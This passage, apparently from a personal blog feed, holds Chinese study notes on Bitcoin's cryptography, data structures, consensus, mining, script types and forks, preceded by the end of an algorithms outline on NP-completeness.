多项式时间的验证</h5><p>哈密顿回路</p><p>验证算法</p><p>复杂类NP</p><h5 id="8-3-NP完全性和可归约性"><a href="#8-3-NP完全性和可归约性" class="headerlink" title="8.3 NP完全性和可归约性"></a>8.3 NP完全性和可归约性</h5><h5 id="8-4-NP完全性的证明"><a href="#8-4-NP完全性的证明" class="headerlink" title="8.4 NP完全性的证明"></a>8.4 NP完全性的证明</h5><h5 id="8-5-NP完全问题"><a href="#8-5-NP完全问题" class="headerlink" title="8.5 NP完全问题"></a>8.5 NP完全问题</h5><p>&#x3D;&#x3D;团问题&#x3D;&#x3D;</p><p>&#x3D;&#x3D;顶点覆盖问题&#x3D;&#x3D;</p><p>&#x3D;&#x3D;哈密顿回路问题&#x3D;&#x3D;</p><p>&#x3D;&#x3D;旅行商问题&#x3D;&#x3D;</p><p>&#x3D;&#x3D;子集和问题&#x3D;&#x3D;</p><h4 id="9-近似算法"><a href="#9-近似算法" class="headerlink" title="9 近似算法"></a>9 近似算法</h4><p>顶点覆盖问题</p><p>旅行商问题</p><p>随机化和线性规划</p><p>子集和问题</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链</title>
    <link href="/blog/2022/09/01/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <url>/blog/2022/09/01/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h2><p>讨论：速度最慢的数据库、下一代价值互联网</p><h3 id="1、比特币中的密码学原理"><a href="#1、比特币中的密码学原理" class="headerlink" title="1、比特币中的密码学原理"></a>1、比特币中的密码学原理</h3><p>比特币又称加密货币，用到了密码学上的哈希和签名</p><h4 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h4><p>密码学上的哈希函数cryptographic hash function两个重要性质：</p><ul><li>collision resistance，两个不同的输入算出来的哈希值相等，称为哈希碰撞，哈希碰撞无法避免，这里是指没有高效的方法人为制造哈希碰撞。<ul><li>MD5曾经是很流行的哈希函数，但现在已经知道如何人为制造哈希碰撞了。</li></ul></li><li>hiding：哈希函数的计算过程是单向的，不可逆的。无法通过哈希值反推输入的内容，哈希值没有泄露输入的信息。</li><li>二者结合在一起，可以实现：digital commitment&#x2F;digital equivalent of a sealed envelope，但要注意，需要输入空间足够大、输入分布要尽量均匀。输入空间不够大时，可以给输入值后面拼接随机数再一起取hash，以保证输入随机且分布均匀。</li><li>比特币中用到的哈希函数还要求第三个性质：puzzle friendly。<ul><li>挖矿：寻找随机数nonce，拼接到block header，使得$H(\text {block header}) \le target$，需要大量的计算，挖矿很难、验证很容易（difficult to solve, but easy to verify）。</li></ul></li></ul><p>比特币中的哈希函数叫做<code>SHA-256</code>。</p><h4 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h4><p>开账户：在本地创立一个公钥和私钥的对（public key, private key)，这就代表了一个比特币的账户，公私钥的概念来自非对称的加密体系（asymmetric encryption algorithm）</p><ul><li>对称加密体系需要安全的网络环境，不能以明文形式在网络上传输，密钥的分发不是很方便。</li><li>非对称加密体系：加密用公钥、解密用私钥，公钥可以公开。</li></ul><p>比特币系统是不加密的，信息都是公开的，公私钥的作用主要就是签名， 发起交易时用自己的私钥签名，其他人用公钥验证，证明交易来自本人。</p><p>生成公私钥的过程要是随机的，比特币中每一次签名时也要有好的随机源，一次随机源不好就有可能泄露私钥。</p><h3 id="2、比特币的数据结构"><a href="#2、比特币的数据结构" class="headerlink" title="2、比特币的数据结构"></a>2、比特币的数据结构</h3><p>哈希指针（hash pointers）：存地址+hash值。（找到位置，检测是否有被篡改）</p><p><strong>区块链：</strong></p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.jpg" alt="区块链的数据结构"></p><p>取hash时，是将前一个区块的内容（包括保存的hash值）一起取hash，通过这个数据结构可以实现tamper-evident log：只要记住系统里保存的最后一个hash值，就可以检测出对区块链任何部位的修改。</p><p><strong>Merkle tree：</strong></p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(1).jpg" alt="merkle tree"></p><p>用hash指针代替了普通的指针。记住根hash值，就能检测出对数中任何节点的修改，效率更高。每个区块分为两部分：块头和块身。</p><ul><li>block header：仅存储这个区块所包含的所有交易组成的merkle tree组成的根hash值。</li><li>block body：有交易列表。</li></ul><p>Merkle tree的用途：</p><ul><li><p>提供merkle proof：从需验证的交易往上找到根节点，这个路径上的节点就是merkle proof，从下往上验证，沿途的这些hash值都是正确的就行了。</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/e65b588da577865af9a1ad6b7339f89.png" alt="merkle proof"></p></li><li><p>proof of membership&#x2F;proof of inclusion：$O(log(n))$</p></li><li><p>proof of non-membership：$O(n)$</p></li><li><p>Sorted merkle tree：对hash值排序</p></li></ul><blockquote><p>hash指针不适用于有环的情况，会出现数据相互依赖从而没有一个区块的数据能定下来。</p></blockquote><h3 id="3、比特币协议"><a href="#3、比特币协议" class="headerlink" title="3、比特币协议"></a>3、比特币协议</h3><p>使用公私钥发行货币：double spending attack</p><p>使用编号，每次使用货币向央行验证归属：央行超负荷（中心化方案）</p><p>将央行的职能改为由用户共同承担（去中心化方案）</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(3).jpg" alt="未命名文件 (3)"></p><p>比特币系统中每个交易都包含了输入和输出两个部分，输入部分要给出币的来源，输出部分要给出收款人公钥的hash。</p><p>付款人的公钥是付款人交易时给出，但可能为伪造，为了验证交易真实，使用付款人给出的公钥和币的来源时的公钥核对。（有借必有贷、借贷必相等）</p><ul><li><p>block header：保存宏观信息</p><ul><li>version 使用比特币哪个版本的协议</li><li>hash of previous block header 区块链中指向前一个区块的指针</li><li>Merkle root hash merkle tree的根hash值</li><li>target 挖矿的难度目标阈值</li><li>nonce 随机数</li></ul></li><li><p>block body：保存交易数据</p><ul><li>transaction list 交易列表</li></ul></li></ul><p>系统中的节点分为全节点(full node)和轻节点(light node)，全节点保存区块链的所有信息，验证每一个交易，也叫fully validating node，轻节点只保存block header，一般来说，轻节点无法独立验证交易的合法性。系统中大部分节点是轻节点，不参与区块链的构造和维护，只是利用区块链的信息做查询等。</p><p>账本的内容要取得分布式的共识 distributed consensus：系统里有很多台机器，共同维护一个全局的hash表（distributed hash table）。</p><p>分布式系统有很多不可能结论，例FLP impossibility result：在一个异步(asynchronous)的系统里(网络传输时延没有上限)，那么即使只有一个成员是有问题的(faulty)，那么也不可能取得共识。</p><p>CAP Theorem：一致性(Consistency)、可用性(Availability)、分区容错性(Partition tolerance)，这三个性质中最多只能满足两个，不可能三个都满足。</p><p>分布式共识的一个重要协议：Paxos(确保一致性)</p><p>比特币中的共识协议：有些节点可能是有恶意的，假设系统中大多数节点是好的。</p><ul><li><p>使用投票：需要先确定谁有投票权(membership)，例如联盟链(hyperledger fabric)，只有某些符合条件的大公司才可以加入，此时基于投票的方案是可行的。但比特币产生账户是很容易的，不需要批准，只有跟外部发生交易时才知道有这个账户存在，可能受到女巫攻击(sybil attack)。</p></li><li><p>比特币中的解决方案：用计算力来投票。</p><ul><li><p>每个节点都可以在本地组装出一个候选区块，把他认为合法的交易放在区块里，然后尝试各种nonce值(4 bytes)，看哪一个能满足不等式要求，求出hash落在指定范围内，如果某个节点找到了符合要求的nonce，就获得了记账权，也即往比特币这个去中心化的系统里写入下一个区块的权力，只有找到nonce，获得记账权的节点才有资格发布下一个区块。</p></li><li><p>其他节点收到这个区块后，要验证这个区块的合法性(验证block header的内容是否正确；目标阈值的编码——nBits域，检查nBits域是否符合比特币协议中规定的难度要求；检查nonce是否使$H(\text {block header}) \le target$成立)，假设都符合要求，然后看block body里的交易列表，验证每个交易都是合法的(要有合法的签名；以前没有被花过)，如果有任何一个不符合要求，那么这个区块是不能被接收的，要被放弃掉。</p></li><li><p>最长合法链 longest vaild chain：假设有一个区块经过检查，都是符合要求的，但如果不在最长链上，也有可能不被接收。比特币协议中规定：接受的区块应该是在扩展最长合法链。（分叉攻击的例子forking attack：通过往中间插入区块，来回滚已经发生了的交易）</p><ul><li>如果两个节点在差不多同一个时间找到了符合要求的nonce，都可以发布区块，这时候会出现两个等长的分叉，按最长合法链原则，这两个都是合法的。</li><li>比特币中，缺省情况下，每个节点是接收它最早收到的那个。</li><li>等长的临时性的分叉可能会维持一段时间，直到最后有某个区块是胜出的，也即沿着这个区块往下扩展，其他分支又被称为orphan block。</li></ul></li><li><p>获得记账权的节点本身有一定权利，可以决定哪些交易被写到下个区块里，但是设计协议时不应该让这个成为争夺记账权的主要动力，因为凡是合法的交易，都应该能被写到区块链里。</p><ul><li><p>出块奖励 block reward 比特币协议中规定，获得记账权的节点在发布的区块里，可以有一个特殊的交易，即铸币交易，在这个交易里可以发布一定数量的比特币。</p></li><li><p>coinbase transaction 是比特币系统中发行新比特币的唯一方法，其他所有的交易都只是把已有的比特币把一个账户转移到另一个账户，包括用法币购买比特币，也没有产生新的比特币。</p></li><li><p>比特币刚上线时，每一个发布的区块可以产生50BTC，21万个区块之后，这个出块奖励就要减半，即25BTC，再过21万个区块，再次减半，即12.5BTC。</p><blockquote><p>21万个区块平均是4年，每隔4年出块奖励减半。</p></blockquote></li></ul></li></ul></li></ul><p>以上即是比特币里的共识机制。</p><h3 id="4、比特币系统的实现"><a href="#4、比特币系统的实现" class="headerlink" title="4、比特币系统的实现"></a>4、比特币系统的实现</h3><p>比特币采取基于交易的账本模式 transaction-based ledger，每个区块里记录的是交易信息，有转账交易、有铸币交易，但是系统中没有显式的记录每个账户有多少钱，需要经过交易记录来推算。</p><p>比特币中的全节点要维护一个UTXO的数据结构(Unspent Transaction Output)——还没有被花出去的交易的输出组成的集合。一个交易可能有多个输出，Utxo中的每个元素要给出产生这个输出的交易的hash值，以及它在这个交易里是第几个输出。新发起的交易是否合法，要查询Utxo，只有在这个集合里才是合法的，维护Utxo以便快速检测double spending。</p><p>每个交易可以有多个输入，也可以有多个输出，所有输入的金额加起来要等于输出的金额。</p><blockquote><p> 有时可能不等，涉及到比特币系统的第二个激励机制：transaction fee</p></blockquote><p>以太坊采取基于账户的模式 account_based ledger，这个模式之中，系统要显式的记录每个账户上有多少个币。</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/e905bb6edc2ab35cd4c40a7b8616245.png" alt="e905bb6edc2ab35cd4c40a7b8616245"></p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/62f9439c6b117abb1d982f4a890709a.png" alt="62f9439c6b117abb1d982f4a890709a"></p><blockquote><p>求hash时只用到了block header的内容，block header里有merkle tree的根hash值，这已经能保证整个区块里的交易是不能被篡改的。</p></blockquote><h4 id="挖矿过程的概率分析"><a href="#挖矿过程的概率分析" class="headerlink" title="挖矿过程的概率分析"></a>挖矿过程的概率分析</h4><p>挖矿即不断尝试nonce，求解puzzle，每次尝试nonce可以看做是一个伯努利实验Bernoulli trial（a random experiment with binary outcome），大量尝试这个过程，构成了一个Bernoulli process（a sequence of independent Bernoulli trials），具有无记忆性（memoryless）。</p><p>每次尝试nonce，成功的可能性很小，需要尝试大量的nonce，才有可能找到符合要求的，这个情况下，Bernoulli process可以用Poisson process来近似（实验的次数很多，每次实验成功的概率很小）。</p><p>出块时间服从指数分布（exponential distribution），整个系统的平均出块时间是10min，这个平均时间是比特币协议设计出来的，通过定期调整挖矿难度，使得平均出块时间维持在10min左右，具体到每一个矿工，能挖到下一个区块的时间，取决于这个矿工的算力占系统总算力的百分比。出块时间的分布也是无记忆的，将来还要挖多少时间跟过去已经挖了多少时间是没有关系的，仍然服从指数分布，平均还是要10min，这个性质也成progress free（过去的progress是没有用的）。</p><blockquote><p>如果没有这个特点，算力强的矿工会有不成比例的优势，这恰恰是挖矿公平性的保证。</p></blockquote><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/1.png" alt="1"></p><h4 id="比特币的总量"><a href="#比特币的总量" class="headerlink" title="比特币的总量"></a>比特币的总量</h4><p>出块奖励是系统中产生新的比特币的唯一途径。而出块奖励每隔四年减半，这样产生的比特币数量就构成了一个几何序列（geometric series）：$21万<em>50+21万</em>25+21万<em>12.5+\dots &#x3D; 21万</em>50*(1+\frac 1 2+\frac 1 4+\dots ) &#x3D; 21万<em>50</em>2 &#x3D;210万$</p><p>比特币的puzzle除了比拼算力之外，没有其他的实际意义，比特币越来越难挖到是因为出块奖励被人为的减少了，比特币的稀缺性是人为造成的。</p><p>但是，挖矿的过程对于维护比特币系统的安全性是至关重要的：Bitcoin is secured by mining。对于一个去中心化的，没有membership控制的系统来说，挖矿提供了一种凭借算力投票的有效手段，只要大部分算力掌握在诚实的节点手里，比特币的安全性就能得到保证，挖矿这个过程虽然表面上看没有实际意义，但是这个机制的设立对于维护整个系统的安全性是非常有效的。</p><h4 id="比特币安全性分析"><a href="#比特币安全性分析" class="headerlink" title="比特币安全性分析"></a>比特币安全性分析</h4><p>假设大部分算力掌握在诚实的矿工手里，是否能保证写入区块链的交易都是合法的？</p><ul><li><p>恶意节点伪造交易：没有对方的私钥无法签名。</p></li><li><p>定义有恶意的攻击是否成功的标准，是看他能不能让诚实的节点接受这个交易，如果仅是恶意节点之间互相认账，诚实节点都不认账，那是没有用的，因为比特币是扩展最长合法链，恶意的区块相当于作废，这对于攻击者来说会损失出块奖励。（&#x3D;&#x3D;这里老师讲的是恶意节点多长都没有用，可如果这个节点本来是诚实的，他后面延伸了很多节点，后来它变成恶意的了，这条链不再扩展，那么它后面的诚实链会受到影响吗？&#x3D;&#x3D;）</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(0).jpg" alt="未命名文件 (0)"></p></li><li><p>能否把已经花出去的币再花一遍？</p></li><li><p>区块插在哪个位置，是要在刚开始挖矿时就要决定的，因为设置的block header里要填前一个区块的hash，如果想插在某个节点之后，一开始就要把该节点设置为前一个区块，而不是等获得了记账权之后再说。防范双花攻击的办法是多等几个区块&#x2F;确认，比特币协议中缺省要等六个confirmation，此时才认为前面一个交易是不可篡改的，平均出块时间10min，这个过程要等一个小时。</p></li></ul><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/4.jpg" alt="4"></p><ul><li><p>零确认 zero confirmation：这个转账交易发布出去，但还没有被写入区块链。比特币中缺省的设置是节点接收最先听到的交易；实际交易天然有时间间隔。</p></li><li><p>恶意节点是否能故意不把合法的交易写在区块链？</p></li><li><p>可以，但合法的交易可以写在下一个区块里，总有诚实的节点愿意发布这些交易，比特币协议规定，区块的大小有限制，最多不能超过1M字节，所以如果交易太多，有些交易就只能等到下一个区块再发布。</p></li><li><p>是否可以隐藏算好的区块，等到交易目标达成再同时发布，以超越已形成的区块&#x2F;confirmation，成为最长链？（selfish mining）</p></li><li><p>正常的情况是挖到区块马上发布，以免被其他人挖到损失奖励，这个攻击成功的前提是需要占到很大的算力。（不可能越级挖，因为每个块需要前一个块的hash，前面一个区块没挖出来，没办法提前准备好）</p><blockquote><p>selfish mining 的另一个目的：减少竞争。</p><p>藏一个块，用两个块竞争，但也有风险，还是拼算力。</p></blockquote></li></ul><h3 id="5、比特币网络"><a href="#5、比特币网络" class="headerlink" title="5、比特币网络"></a>5、比特币网络</h3><p>用户把交易发布到比特币网络上，节点收到这些交易把他们打包到区块里，然后把区块发布到比特币网络上，这些新发布的交易和区块在比特币网络上如何传播？</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/5.jpg" alt="5"></p><p>比特币网络的设计原则：简单、鲁棒而非高效。</p><p>消息以flooding的方式传播：节点第一次收到消息时，将它传播给其他邻居节点，同时记录已收到这个消息，下次再收到这个消息，就不再转发给邻居节点，邻居节点的选取是随机的，不考虑底层的拓扑结构，鲁棒性很强，但牺牲了效率。</p><p>比特币系统中每个节点要维护一个等待上链交易的集合，第一次听到某个交易时，把这个交易写入集合，并且转发这个交易，再收到这个交易就不转发，转发的前提是交易合法（有合法的签名，以前没有被花过）。</p><p>集合中的交易一旦写入区块链，就要从集合中删掉，如果因为某个区块链里的交易导致集合里出现了非法交易，也要删除非法交易。</p><blockquote><p>risk condition：有两个有冲突的交易，差不多同时被广播到网络上，那么每个节点因为在网络上的位置不同，先收到的交易不同。</p></blockquote><p>新发布的区块在网络上的传播方式跟新发布的交易是类似的，每个节点除了检查区块的内容的合法性，还要检查它是否在最长合法链上，越是大的区块在网络上的传播速度就越慢。</p><p>best effort：一个交易发布到比特币网络上，不一定所有的节点都能收到，而且不同的节点收到交易的顺序也可能是不一样的，网络传播存在延迟，且有的节点不一定按照比特币协议的要求进行转发，也有的节点可能转发不合法的交易，这是一个去中心化的系统中面临的实际问题。</p><h3 id="6、比特币的挖矿难度调整"><a href="#6、比特币的挖矿难度调整" class="headerlink" title="6、比特币的挖矿难度调整"></a>6、比特币的挖矿难度调整</h3><p>挖矿：不断尝试block header里的nonce值，使整个block header的哈希值小于等于给定的目标阈值。即$H(\text{block header}) \le target$。$target$越小，挖矿难度越大，调整挖矿难度就是调整目标空间在整个输出空间中所占的比例。</p><p>比特币用的哈希算法是SHA-256，产生的哈希值是256位，所以整个输出空间是$2^{256}$个可能的取值，调整这个比例就是哈希值前面有多少个0（不准确）。</p><p>出块时间太短会出现的问题：</p><ul><li>分叉会成为常态，分叉过多，对于不利于系统达成共识，也危害系统安全（比特币协议假设大部分算力掌握在诚实的矿工手里，系统的总算力越强，安全性越好）。恶意节点可以集中算力扩展成最长合法链。</li></ul><p>比特币协议中规定：每隔2016个区块，要重新调整目标阈值，大概是每两个星期调整一下（$\frac {2016<em>10} {60</em>24} &#x3D; 14天$）。具体调整方式为$target &#x3D; target * \frac {\text{actual time}} {\text{experted time}}$，目标阈值增大最多增大4倍，不会超过4倍；目标阈值缩小最多缩小$\frac 1 4$，不会超过$\frac 1 4$。</p><p>计算$target$的方法是写在比特币系统的代码里，每挖到2016个区块会自动进行调整，代码开源，如果$target$被恶意修改，诚实的矿工不会承认。</p><ul><li>nBits域：$target$编码的版本，在block header里没有直接存储$target$，因为需要256位&#x2F;32个字节，而nBits只有4个字节，可以认为是一个压缩编码，如果没有按规则调整$target$，检查区块合法性就无法通过，因为每个节点要独立验证发布的区块的合法性。</li></ul><h3 id="7、比特币挖矿"><a href="#7、比特币挖矿" class="headerlink" title="7、比特币挖矿"></a>7、比特币挖矿</h3><p>全节点</p><ul><li>一直在线</li><li>在本地硬盘上维护完整的区块链信息</li><li>在内存里维护UTXO集合，以便快速检验交易的正确性</li><li>监听比特币网络上的交易信息，验证每个交易的合法性</li><li>决定哪些交易会被打包到区块里</li><li>监听别的矿工挖出来的区块，验证其合法性</li><li>挖矿<ul><li>决定验证哪条链挖下去</li><li>当出现等长的分叉的时候，选择哪一个分叉</li></ul></li></ul><p>轻节点</p><ul><li>不是一直在线</li><li>不用保存整个区块链，只要保存每个区块的块头（1000倍）</li><li>不用保存全部交易，只保存与自己相关的交易</li><li>无法校验大多数交易的合法性，只能校验与自己相关的那些交易的合法性</li><li>无法检测网上发布的区块的正确性</li><li>可以验证挖矿的难度</li><li>只能检测哪个是最长链，不知道哪个是最长合法链</li></ul><p>比特币怎么保证安全性</p><ul><li>密码学上的保证：没有私钥，就无法伪造签名，不能将他人账上的前转走，前提是，系统中拥有大多数算力的矿工是好的，是遵守协议的，不会接受那些没有合法签名的交易，如果没有这一点，密码学上的保证就没有用武之地。</li><li>共识机制</li></ul><p>挖矿设备</p><ul><li><p>趋于专业化：CPU挖矿（通用计算机、笔记本电脑）→ GPU挖矿（主要用于大规模的并行计算，例如深度学习，大量的矩阵乘法） → ASIC芯片（application specific integrated circulation）</p></li><li><p>大型矿池的出现：单个矿工即使用了ASIC芯片，挖矿从平均收益上看是有利可图的，但是收益是非常不稳定的，除了挖矿外，单个矿工还要承担全节点的其他责任。矿池就是把矿工组织起来成为一个整体，矿石的架构是一个全节点会驱动很多矿机。</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/6.jpg" alt="6"></p><p>矿工只负责计算哈希值，全节点的其他职责都由pool manager来承担（监听网上的交易、把交易组织打包成候选区块、是否有其他节点抢先发布区块，有的话要进行调整）。</p><p>矿池的出现解决了收入不稳定的问题，收入分配时，矿主以矿工提交的较简单的almost valid block作为share的数量为依据进行分配。</p><p>是否会出现矿工挖到矿后不提交给矿池，自己独占奖励？</p><ul><li>不可行，每个矿工的任务是有矿主分配的，矿主负责组装好区块，然后交给矿工尝试nonce，光是调整nonce是不够的，还要调整coinbase，矿主可能把不同的coinbase对应的nonce值的范围交给不同的矿工尝试，coinbase transaction的地址填的是矿主的地址，所以矿工挖到区块后不提交给矿主，自己提交是无用的。</li></ul><p>大型矿池的一个弊病：51%的攻击更容易了（分叉攻击、双花攻击、Boycott封锁某个账户）。类似云计算里的on demand computing，此处为on demand mining，矿石带来的潜在危害。</p></li></ul><h3 id="8、比特币脚本"><a href="#8、比特币脚本" class="headerlink" title="8、比特币脚本"></a>8、比特币脚本</h3><p>唯一能访问的内存空间就是堆栈，所以是基于栈的语言。</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/fb118d0f3f3f69f20c421b3b978ce13.jpg" alt="fb118d0f3f3f69f20c421b3b978ce13"></p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/a44e90b2b47b4759d5d81b91b166c8f.jpg" alt="a44e90b2b47b4759d5d81b91b166c8f"></p><blockquote><p>每个输入都要说明这个输入的币来自之前哪个交易的输出，前两行给出输入的币的来源，第三项是输入脚本，给出signature证明有权力花这个钱。</p></blockquote><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/2175087397b6f48030dd2daf87dc210.jpg" alt="2175087397b6f48030dd2daf87dc210"></p><blockquote><p>scriptPublicKey是输出脚本，asm是输出脚本内容，包含一系列操作，reqSigs表示这个输出需要多少个签名才能兑现，type是输出的类型，这里表示公钥的哈希，addresses是输出的地址。</p></blockquote><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/df1c2ac503eaaa4ca31f23169e91964.jpg" alt="df1c2ac503eaaa4ca31f23169e91964"></p><blockquote><p>输出脚本要与输入脚本匹配</p></blockquote><p>输入输出脚本的形式</p><ul><li><p>P2PK(Pay to Public Key)</p><ul><li><p>input script</p><ul><li>PUSHDATA(Sig)</li></ul></li><li><p>output script</p><ul><li>PUSHDATA(PubKey)&#x2F;&#x2F;输出脚本里直接给出收款人的公钥。</li><li>CHECKSIG&#x2F;&#x2F;检查签名，在输入脚本里直接检查签名，签名是用私钥对输入脚本所在的整个交易的签名，是最简单的。</li></ul></li><li><p>实例：</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/9f2bc3262d66508b9926191b78f1d49.jpg" alt="9f2bc3262d66508b9926191b78f1d49"></p></li></ul></li><li><p>P2PKH(Pay to Public Key Hash)</p><ul><li><p>input script</p><ul><li>PUSHDATA(Sig)&#x2F;&#x2F;把签名压入栈</li><li>PUSHDATA(Public)&#x2F;&#x2F;把公钥压入栈</li></ul></li><li><p>output script</p><ul><li>DUP&#x2F;&#x2F;把栈顶元素复制一遍(栈顶为两个公钥)</li><li>HASH160&#x2F;&#x2F;把栈顶元素弹出来，取哈希，然后把得到的哈希值压入栈(栈顶为公钥的哈希值)(输入脚本里给出的公钥)</li><li>PUSHDATA(PubKeyHash)&#x2F;&#x2F;把输出脚本里提供的公钥的哈希值压入栈(收款人的公钥的哈希)</li><li>EQUALVERIFY&#x2F;&#x2F;弹出栈顶两个元素是否相等，防止冒名顶替</li><li>CHECKSIG&#x2F;&#x2F;弹出栈顶的两个元素，用公钥检查签名</li></ul></li><li><p>实例</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/0223bb1d47a9820801fef7d25ca796d.jpg" alt="0223bb1d47a9820801fef7d25ca796d"></p></li></ul></li><li><p>P2SH(Pay to Script Hash)</p><ul><li><p>采用BIP16的方案</p></li><li><p>input script</p><ul><li><p>……</p></li><li><p>PUSHDATA(Sig)</p></li><li><p>……</p></li><li><p>PUSHDATA(serialized redeemScript)</p></li></ul></li><li><p>output script</p><ul><li>HASH160</li><li>PUSHDATA(redeemScriptHash)(赎回脚本)</li><li>EQUAL</li></ul></li><li><p>input script要给出一些签名（数目不定）及一段序列化的redeemScript，验证分为如下两步：</p><ul><li>验证序列化的redeemScript是否与output script中的哈希值匹配</li><li>反序列化并执行redeemScript，验证input script中给出的签名是否正确</li></ul></li><li><p>redeemScript的形式</p><ul><li>P2PK形式</li><li>P2PKH形式</li><li>多重签名形式</li></ul></li><li><p>例：用P2SH实现P2PK</p><ul><li>redeemScript<ul><li>PUSHDATA(PubKey)</li><li>CHECKSIG</li></ul></li><li>input script<ul><li>PUSHDATA(Sig)</li><li>PUSHDATA(serialized redeemScript)</li></ul></li><li>output script<ul><li>HASH160</li><li>PUSHDATA(redeemScriptHash)</li><li>EQUAL</li></ul></li></ul></li><li><p>P2SH的一个常见场景是对多重签名的支持</p><ul><li><p>比特币系统中一个输出可能性需要多个签名才能把钱取出来</p></li><li><p>最早的多重签名，目前已不推荐使用</p><ul><li>input script<ul><li>X&#x2F;&#x2F;需要多压一个没用的元素，已对应CHECKMULITISIG的bug</li><li>PUSHDATA(Sig_1)</li><li>PUSHDATA(Sig_2)</li><li>……</li><li>PUSHDATA(Sig_M)</li></ul></li><li>outputScript<ul><li>M</li><li>PUSHDATA(pubkey_1)</li><li>PUSHDATA(pubkey_2)</li><li>……</li><li>PUSHDATA(pubkey_N)</li><li>N</li><li>CHECKMULTISIG</li></ul></li></ul></li><li><p>用P2SH实现多重签名</p><ul><li>把输出脚本的复杂度转移到输入脚本</li><li>redeemScript<ul><li>M</li><li>PUSHDATA(pubkey_1)</li><li>PUSHDATA(pubkey_2)</li><li>……</li><li>PUSHDATA(pubkey_N)</li><li>N</li><li>CHECKMULTISIG</li></ul></li><li>input script<ul><li>X</li><li>PUSHDATA(Sig_1)</li><li>PUSHDATA(Sig_2)</li><li>……</li><li>PUSHDATA(Sig_M)</li><li>PUSHDATA(serialized RedeemScript)</li></ul></li><li>output script<ul><li>HASH160</li><li>PUSHDATA(RedeemScriptHash)</li><li>EQUAL</li></ul></li></ul></li><li><p>实例</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/3694329da6ab2de67074e3d6382151d.jpg" alt="3694329da6ab2de67074e3d6382151d"></p></li></ul></li></ul></li><li><p>Proof of Burn</p><ul><li><p>output script</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs script">RETURN //无条件返回错误，包含这个操作的脚本永远不可能通过验证<br>[zero or more ops or test]<br></code></pre></td></tr></table></figure><p>这种形式的output被称为：Provably Unspendable&#x2F;Prunable Outputs</p></li><li><p>脚本说明</p><p>假如有一个交易的input指向这个output，无论input里的input script如何设计，执行到RETURN命令之后都会直接但会false，不会执行RETURN后面的其他指令，所以这个output无法再被花出去，其对应的UTXO也就可以被剪枝了，无需保存。</p><p>应用场景：</p><ul><li><p>这个脚本是证明销毁比特币的一种方法，有些小币种要求销毁一定数量的比特币才能得到这个币种（AltCoin）。</p></li><li><p>在区块链里添加需要永久保存的内容，如digital commitment，把某项知识产权的内容取hash后，把hash值放在RETURN语句的后面，不会占很大的内容，也不会泄露知识产权的内容，应对知识产权的纠纷。</p><blockquote><p>coinbase域里也可以随意写内容，且不用销毁比特币，但只有获得记账权的节点才能用。</p></blockquote></li></ul></li></ul></li></ul><blockquote><p>注：简单起见，所有的操作都省略了OP_前缀，例：OP_CHECKSIG、OP_DUP</p><p>比特币的脚本语言不支持循环，就不会有死循环</p></blockquote><h3 id="9、比特币分叉"><a href="#9、比特币分叉" class="headerlink" title="9、比特币分叉"></a>9、比特币分叉</h3><p>分叉的原因：两个节点差不多同时挖到矿，会出现临时性的分叉（state fork）；分叉攻击（forKing attack&#x2F;deliberate fork）；比特币的协议发生了改变，去中心化的系统中升级软件没办法保证所有节点都升级（protocal fork），根据对协议修改的内容的不同，又可分为硬分叉（hard fork）和软分叉（soft fork）。</p><p>硬分叉：对比特币协议增加一些新的特性，这时候没有升级软件的旧的节点不认可这些特性，认为这些特性非法。一个例子是比特币协议中的区块大小限制（block size limit），某些新节点改为了4M，旧节点依然是1M，只要旧节点不更新软件，这个分叉就不会消失。出现hard fork后变成了两条平行的链，彼此之间有各自的加密货币（社区分裂），分叉前的链理论上分叉后的链都会认，但会出现问题，后来分裂的链会带一条chain Id。</p><blockquote><p>目前区块大小限制</p><p>$\frac {1000000} {250} &#x3D; 4000$   $\frac {4000} {60*10} &#x3D; 7 tx&#x2F;s$</p></blockquote><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/7.jpg" alt="7"></p><p>软分叉：对比特币协议加一些限制，原来合法的交易&#x2F;区块，在新的协议中可能变得不合法。例某些新节点将区块大小限制改为了0.5M，旧节点依然是1M，因为新旧节点都认可的是0.5M的分叉，所以之后所有节点都会在0.5M的链上扩展，迫使其更新协议，系统不会有永久性的分叉。</p><p><img src="https://raw.githubusercontent.com/Yoonalis/img/master/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(4).jpg" alt="未命名文件 (4)"></p><p>实际可能出现软分叉的情况：给某些目前协议中没有规定的域增加一些新的含义，赋予新的规则，例coinbase域，有时会把coinbase域的前八个字节也作为extra 